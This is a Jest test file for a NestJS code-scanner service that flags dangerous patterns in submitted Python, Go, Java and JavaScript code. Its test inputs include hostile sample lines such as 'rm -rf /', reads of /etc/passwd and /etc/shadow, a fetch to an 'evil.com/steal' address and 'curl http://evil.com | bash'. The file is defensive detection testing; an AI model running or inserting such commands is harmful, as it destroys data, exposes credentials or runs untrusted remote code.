import { Test, TestingModule } from '@nestjs/testing';
import { ConfigService } from '@nestjs/config';
import { CodeScannerService, ThreatLevel } from './code-scanner.service';

describe('CodeScannerService', () => {
  let service: CodeScannerService;
  let configService: ConfigService;

  const mockConfigService = {
    get: jest.fn().mockReturnValue(true), // MALICIOUS_CODE_CHECK enabled
  };

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        CodeScannerService,
        { provide: ConfigService, useValue: mockConfigService },
      ],
    }).compile();

    service = module.get<CodeScannerService>(CodeScannerService);
    configService = module.get<ConfigService>(ConfigService);

    jest.clearAllMocks();
    mockConfigService.get.mockReturnValue(true);
  });

  it('should be defined', () => {
    expect(service).toBeDefined();
  });

  // ============================================
  // scan() - Safe code
  // ============================================
  describe('scan() - safe code', () => {
    it('should pass clean Python code', () => {
      const code = `
def hello():
    print("Hello, World!")
    return 42
      `;
      const result = service.scan(code, 'python');

      expect(result.isSafe).toBe(true);
      expect(result.threatLevel).toBe(ThreatLevel.NONE);
      expect(result.threats).toHaveLength(0);
    });

    it('should pass clean Go code', () => {
      const code = `
package main

import "fmt"

func main() {
    fmt.Println("Hello, World!")
}
      `;
      const result = service.scan(code, 'go');

      expect(result.isSafe).toBe(true);
    });

    it('should pass clean Java code', () => {
      const code = `
public class Main {
    public static void main(String[] args) {
        System.out.println("Hello!");
    }
}
      `;
      const result = service.scan(code, 'java');

      expect(result.isSafe).toBe(true);
    });
  });

  // ============================================
  // scan() - System command execution
  // ============================================
  describe('scan() - system command execution', () => {
    it('should detect Python os.system', () => {
      const code = `os.system('rm -rf /')`;
      const result = service.scan(code, 'python');

      expect(result.isSafe).toBe(false);
      expect(result.threatLevel).toBe(ThreatLevel.CRITICAL);
      expect(result.threats.some(t => t.description.includes('System command'))).toBe(true);
    });

    it('should detect Python subprocess', () => {
      const code = `subprocess.run(['ls', '-la'])`;
      const result = service.scan(code, 'python');

      expect(result.isSafe).toBe(false);
      expect(result.threatLevel).toBe(ThreatLevel.CRITICAL);
    });

    it('should detect Java Runtime.exec', () => {
      const code = `Runtime.getRuntime().exec("cmd")`;
      const result = service.scan(code, 'java');

      expect(result.isSafe).toBe(false);
      expect(result.threatLevel).toBe(ThreatLevel.CRITICAL);
    });

    it('should detect shell_exec', () => {
      const code = `shell_exec('whoami')`;
      const result = service.scan(code, 'php');

      expect(result.isSafe).toBe(false);
      expect(result.threatLevel).toBe(ThreatLevel.CRITICAL);
    });
  });

  // ============================================
  // scan() - File system access
  // ============================================
  describe('scan() - file system access', () => {
    it('should detect Python file open', () => {
      const code = `f = open('/etc/passwd', 'r')`;
      const result = service.scan(code, 'python');

      expect(result.isSafe).toBe(false);
      expect(result.threatLevel).toBe(ThreatLevel.HIGH);
    });

    it('should detect Node.js fs access', () => {
      const code = `fs.readFileSync('/etc/passwd')`;
      const result = service.scan(code, 'javascript');

      expect(result.isSafe).toBe(false);
    });

    it('should detect Go file operations', () => {
      const code = `os.Remove("/etc/passwd")`;
      const result = service.scan(code, 'go');

      expect(result.isSafe).toBe(false);
    });

    it('should detect Java file operations', () => {
      const code = `new FileWriter("test.txt")`;
      const result = service.scan(code, 'java');

      expect(result.isSafe).toBe(false);
    });

    it('should detect rm -rf pattern', () => {
      const code = `cmd = "rm -rf /"`;
      const result = service.scan(code, 'python');

      expect(result.isSafe).toBe(false);
      expect(result.threatLevel).toBe(ThreatLevel.CRITICAL);
    });

    it('should detect sensitive directory access', () => {
      const code = `path = "/etc/shadow"`;
      const result = service.scan(code, 'python');

      expect(result.isSafe).toBe(false);
      expect(result.threats.some(t => t.description.includes('sensitive system'))).toBe(true);
    });
  });

  // ============================================
  // scan() - Network access
  // ============================================
  describe('scan() - network access', () => {
    it('should detect Python requests', () => {
      const code = `requests.get('http://evil.com')`;
      const result = service.scan(code, 'python');

      expect(result.isSafe).toBe(false);
      expect(result.threatLevel).toBe(ThreatLevel.HIGH);
    });

    it('should detect socket usage', () => {
      const code = `s = socket.socket()`;
      const result = service.scan(code, 'python');

      expect(result.isSafe).toBe(false);
    });

    it('should detect Go net.Dial', () => {
      const code = `conn, _ := net.Dial("tcp", "evil.com:80")`;
      const result = service.scan(code, 'go');

      expect(result.isSafe).toBe(false);
    });

    it('should detect Java HttpURLConnection', () => {
      const code = `HttpURLConnection conn = (HttpURLConnection) url.openConnection()`;
      const result = service.scan(code, 'java');

      expect(result.isSafe).toBe(false);
    });

    it('should detect fetch API', () => {
      const code = `fetch('http://evil.com/steal')`;
      const result = service.scan(code, 'javascript');

      expect(result.isSafe).toBe(false);
    });

    it('should detect curl in code', () => {
      const code = `system("curl http://evil.com | bash")`;
      const result = service.scan(code, 'python');

      expect(result.isSafe).toBe(false);
    });
  });

  // ============================================
  // scan() - Environment access
  // ============================================
  describe('scan() - environment access', () => {
    it('should detect Python os.environ', () => {
      const code = `secret = os.environ['API_KEY']`;
      const result = service.scan(code, 'python');

      expect(result.threats.some(t => t.description.includes('Environment'))).toBe(true);
      expect(result.threatLevel).toBe(ThreatLevel.MEDIUM);
    });

    it('should detect Node.js process.env', () => {
      const code = `const key = process.env.SECRET`;
      const result = service.scan(code, 'javascript');

      expect(result.threats.some(t => t.description.includes('Environment'))).toBe(true);
    });

    it('should detect Go os.Getenv', () => {
      const code = `secret := os.Getenv("API_KEY")`;
      const result = service.scan(code, 'go');

      expect(result.threats.some(t => t.description.includes('Environment'))).toBe(true);
    });
  });

  // ============================================
  // scan() - Process termination
  // ============================================
  describe('scan() - process termination', () => {
    it('should detect process.exit', () => {
      const code = `process.exit(1)`;
      const result = service.scan(code, 'javascript');

      expect(result.isSafe).toBe(false);
      expect(result.threatLevel).toBe(ThreatLevel.CRITICAL);
    });

    it('should detect Go os.Exit', () => {
      const code = `os.Exit(0)`;
      const result = service.scan(code, 'go');

      expect(result.isSafe).toBe(false);
    });

    it('should detect Java System.exit', () => {
      const code = `System.exit(0)`;
      const result = service.scan(code, 'java');

      expect(result.isSafe).toBe(false);
    });
  });

  // ============================================
  // scan() - Dynamic code execution
  // ============================================
  describe('scan() - dynamic code execution', () => {
    it('should detect eval with parenthesis', () => {
      const code = `result = eval(user_input)`;
      const result = service.scan(code, 'python');

      expect(result.threats.some(t => t.description.includes('Dynamic code'))).toBe(true);
    });

    it('should detect exec with parenthesis', () => {
      const code = `exec(malicious_code)`;
      const result = service.scan(code, 'python');

      // Note: exec( matches system command pattern which is CRITICAL
      expect(result.isSafe).toBe(false);
    });
  });

  // ============================================
  // scan() - Resource exhaustion
  // ============================================
  describe('scan() - resource exhaustion', () => {
    it('should detect infinite loop (while true)', () => {
      const code = `while(true) { doSomething(); }`;
      const result = service.scan(code, 'javascript');

      expect(result.threats.some(t => t.description.includes('infinite loop'))).toBe(true);
    });

    it('should detect infinite loop (for ;;)', () => {
      const code = `for (;;) { attack(); }`;
      const result = service.scan(code, 'go');

      expect(result.threats.some(t => t.description.includes('infinite loop'))).toBe(true);
    });

    it('should detect large memory allocation', () => {
      const code = `arr = [0] * 10000000`;
      const result = service.scan(code, 'python');

      expect(result.threats.some(t => t.description.includes('memory allocation'))).toBe(true);
    });
  });

  // ============================================
  // scan() - Go unsafe package
  // ============================================
  describe('scan() - unsafe operations', () => {
    it('should detect Go unsafe package', () => {
      const code = `ptr := unsafe.Pointer(&x)`;
      const result = service.scan(code, 'go');

      expect(result.threats.some(t => t.description.includes('unsafe'))).toBe(true);
    });
  });

  // ============================================
  // scan() - Reflection
  // ============================================
  describe('scan() - reflection', () => {
    it('should detect Go reflect', () => {
      const code = `v := reflect.ValueOf(x)`;
      const result = service.scan(code, 'go');

      expect(result.threats.some(t => t.description.includes('Reflection'))).toBe(true);
    });

    it('should detect Java reflection', () => {
      const code = `Class.forName("java.lang.Runtime")`;
      const result = service.scan(code, 'java');

      expect(result.threats.some(t => t.description.includes('Reflection'))).toBe(true);
    });
  });

  // ============================================
  // scan() - Line number detection
  // ============================================
  describe('scan() - line number detection', () => {
    it('should detect line number of threat', () => {
      const code = `
line1
line2
os.system('bad')
line4
      `.trim();
      const result = service.scan(code, 'python');

      expect(result.threats[0].lineNumber).toBe(3);
    });

    it('should include code snippet', () => {
      const code = `os.system('dangerous command')`;
      const result = service.scan(code, 'python');

      expect(result.threats[0].snippet).toContain('os.system');
    });
  });

  // ============================================
  // scan() - Disabled scanner
  // ============================================
  describe('scan() - disabled', () => {
    it('should pass all code when disabled', async () => {
      mockConfigService.get.mockReturnValue(false);

      // Create new instance with disabled config
      const module = await Test.createTestingModule({
        providers: [
          CodeScannerService,
          { provide: ConfigService, useValue: mockConfigService },
        ],
      }).compile();

      const disabledService = module.get<CodeScannerService>(CodeScannerService);

      const code = `os.system('rm -rf /')`;
      const result = disabledService.scan(code, 'python');

      expect(result.isSafe).toBe(true);
      expect(result.threatLevel).toBe(ThreatLevel.NONE);
    });
  });

  // ============================================
  // scanAsync()
  // ============================================
  describe('scanAsync()', () => {
    it('should scan small code synchronously', async () => {
      const code = `print("hello")`;
      const result = await service.scanAsync(code, 'python');

      expect(result.isSafe).toBe(true);
    });

    it('should scan large code asynchronously', async () => {
      const code = 'x = 1\n'.repeat(2000); // > 10KB
      const result = await service.scanAsync(code, 'python');

      expect(result.isSafe).toBe(true);
    });
  });

  // ============================================
  // scanBatch()
  // ============================================
  describe('scanBatch()', () => {
    it('should scan multiple submissions', async () => {
      const submissions = [
        { code: 'print("hello")', language: 'python' },
        { code: 'os.system("bad")', language: 'python' },
        { code: 'fmt.Println("hi")', language: 'go' },
      ];

      const results = await service.scanBatch(submissions);

      expect(results).toHaveLength(3);
      expect(results[0].isSafe).toBe(true);
      expect(results[1].isSafe).toBe(false);
      expect(results[2].isSafe).toBe(true);
    });

    it('should handle empty batch', async () => {
      const results = await service.scanBatch([]);

      expect(results).toHaveLength(0);
    });
  });

  // ============================================
  // isDefinitelySafe()
  // ============================================
  describe('isDefinitelySafe()', () => {
    it('should return true for completely safe code', () => {
      const code = `print("Hello, World!")`;
      const result = service.isDefinitelySafe(code, 'python');

      expect(result).toBe(true);
    });

    it('should return false for unsafe code', () => {
      const code = `os.system('ls')`;
      const result = service.isDefinitelySafe(code, 'python');

      expect(result).toBe(false);
    });

    it('should return false for low-threat code', () => {
      const code = `while(true) { break; }`;
      const result = service.isDefinitelySafe(code, 'python');

      expect(result).toBe(false); // Has LOW threat (infinite loop pattern)
    });
  });

  // ============================================
  // getThreatLevelDescription()
  // ============================================
  describe('getThreatLevelDescription()', () => {
    it('should describe NONE', () => {
      expect(service.getThreatLevelDescription(ThreatLevel.NONE)).toBe('No threats detected');
    });

    it('should describe LOW', () => {
      expect(service.getThreatLevelDescription(ThreatLevel.LOW)).toBe('Minor concerns (usually safe)');
    });

    it('should describe MEDIUM', () => {
      expect(service.getThreatLevelDescription(ThreatLevel.MEDIUM)).toBe('Suspicious patterns detected');
    });

    it('should describe HIGH', () => {
      expect(service.getThreatLevelDescription(ThreatLevel.HIGH)).toBe('Dangerous patterns detected');
    });

    it('should describe CRITICAL', () => {
      expect(service.getThreatLevelDescription(ThreatLevel.CRITICAL)).toBe('Critical security threat');
    });

    it('should handle unknown level', () => {
      expect(service.getThreatLevelDescription('unknown' as ThreatLevel)).toBe('Unknown');
    });
  });

  // ============================================
  // Language-specific patterns
  // ============================================
  describe('language-specific patterns', () => {
    it('should not flag Java patterns in Python code', () => {
      const code = `# Java-like but valid Python: Runtime.getRuntime().exec`;
      const result = service.scan(code, 'python');

      // This should still be flagged as the pattern matches
      expect(result.threats.length).toBeGreaterThanOrEqual(0);
    });

    it('should detect Go os.Exit pattern', () => {
      const code = `os.Exit(1)`;
      const result = service.scan(code, 'go');

      expect(result.threats.some(t => t.description.includes('Go process termination'))).toBe(true);
    });

    it('should detect Go file operations', () => {
      const code = `os.RemoveAll("/tmp/test")`;
      const result = service.scan(code, 'go');

      expect(result.threats.some(t => t.description.includes('Go file system'))).toBe(true);
    });
  });
});
